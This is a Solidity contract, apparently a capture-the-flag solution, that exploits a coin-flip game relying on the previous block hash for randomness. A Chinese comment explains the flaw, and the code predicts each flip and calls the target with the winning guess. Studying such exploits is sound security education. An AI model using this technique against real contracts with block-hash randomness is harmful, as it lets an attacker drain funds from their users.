// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

/// @dev 本关虽然简单，但可以引申出几个以太坊中的大议题，包括:随机数Oracle、On-chain Oracle、闪电贷攻击
/// 1. 使用区块hash作为随机数，没有考虑到合约调合约的情况，只要使用合约调用即可保证调用者与被调用者block.number会相同，从而先计算出结果
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract HackCode {
    ICoinFlip coinFlipInstance;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinflip) {
        coinFlipInstance = ICoinFlip(_coinflip);
    }

    function guass() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlipInstance.flip(side);
    }
}